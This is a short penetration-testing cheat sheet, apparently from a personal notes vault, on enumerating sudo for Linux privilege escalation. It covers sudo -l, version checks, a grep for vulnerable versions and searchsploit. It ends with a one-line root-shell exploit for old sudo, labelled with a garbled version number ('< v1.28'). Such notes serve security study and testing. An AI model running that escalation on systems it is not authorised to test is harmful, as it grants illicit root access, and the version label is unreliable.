---
id: Sudo Enumeration
aliases: []
tags:
  - Linux/Privesc/Sudo-Enumeration
links: "[[Privesc]]"
---

# Sudo Enumeration

___

<!-- Commands {{{-->
## Commands

Check which commands the current user may run

> [!tip]
>
> Exploit the found command(*s*)
>
> - [GTFOBins](https://gtfobins.github.io/)

[sudo](https://man7.org/linux/man-pages/man8/sudo.8.html) —
Execute a command as another user

```sh
sudo -l
```

[sudo](https://man7.org/linux/man-pages/man8/sudo.8.html) —
Run command as specified user (*e.g., `user`*)

```sh
sudo -u user /bin/echo Hello World!
```
___
<!-- }}} -->

<!-- Version {{{-->
## Version

Check `sudo` version

```sh
sudo --version
```

```sh
sudo -V
```
___
<!-- }}} -->

<!-- Vulnerabilities {{{-->
## Vulnerabilities

Check if `sudo` version is in a vulnerable range

```sh
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

[[SearchSploit]] — Search `sudo` version for public exploits

```sh
searchsploit sudo
```

`sudo` < v1.28

```sh
sudo -u#-1 /bin/bash
```
___
<!-- }}} -->
